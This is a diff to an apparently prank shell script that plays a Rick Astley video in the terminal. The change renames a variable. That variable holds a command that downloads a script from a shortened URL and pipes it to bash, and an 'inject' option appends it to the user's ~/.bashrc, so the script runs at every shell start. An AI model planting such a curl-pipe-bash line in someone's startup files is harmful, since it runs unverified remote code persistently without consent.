@@ -9,7 +9,7 @@ video="$rick/astley80.full.bz2"
 audio_gsm="$rick/roll.gsm"
 audio_raw="$rick/roll.s16"
 audpid=0
-NEVER_GONNA='curl -s -L http://bit.ly/10hA8iC | bash'
+NEVER_SURRENDER='curl -s -L http://bit.ly/10hA8iC | bash'
 MAKE_YOU_CRY="$HOME/.bashrc"
 red='\x1b[38;5;9m'
 yell='\x1b[38;5;216m'
@@ -34,10 +34,10 @@ for arg in "$@"; do
     usage && exit
   elif [[ "$arg" == "inject" ]]; then
     echo -en "${red}[Inject] "
-    echo $NEVER_GONNA >> $MAKE_YOU_CRY
+    echo $NEVER_SURRENDER >> $MAKE_YOU_CRY
     echo -e "${green}Appended to $MAKE_YOU_CRY. <3"
     echo -en "${yell}If you've astley overdosed, "
-    echo -e "delete the line ${purp}\"$NEVER_GONNA\"${yell}."
+    echo -e "delete the line ${purp}\"$NEVER_SURRENDER\"${yell}."
     exit
   else
     echo -e "${red}Unrecognized option: \"$arg\""
